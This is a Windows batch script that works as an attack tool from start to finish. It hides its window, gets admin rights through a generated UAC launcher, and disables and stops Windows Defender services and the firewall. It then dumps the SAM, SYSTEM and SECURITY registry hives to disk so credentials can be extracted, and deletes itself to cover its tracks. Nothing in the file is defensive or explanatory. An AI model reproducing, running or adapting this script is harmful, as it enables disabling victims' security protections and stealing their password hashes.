@echo off
setlocal enabledelayedexpansion

:: Hide the console window
if not "%1"=="hidden" (
    powershell -window hidden -command "& '%0' hidden"
    exit /b
)

:: Request admin privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "hidden", "", "runas", 0 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /b
)

:: Disable Windows Defender services
sc config WinDefend start= disabled >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
sc config Sense start= disabled >nul 2>&1
sc config SecurityHealthService start= disabled >nul 2>&1

net stop WinDefend /y >nul 2>&1
net stop WdNisSvc /y >nul 2>&1
net stop Sense /y >nul 2>&1
net stop SecurityHealthService /y >nul 2>&1

:: Disable Windows Firewall
netsh advfirewall set allprofiles state off >nul 2>&1
sc config MpsSvc start= disabled >nul 2>&1
net stop MpsSvc /y >nul 2>&1

:: Extract SAM files
reg save hklm\sam C:\sam.save /y >nul 2>&1
reg save hklm\system C:\system.save /y >nul 2>&1
reg save hklm\security C:\security.save /y >nul 2>&1

:: Cleanup
del "%~f0" >nul 2>&1
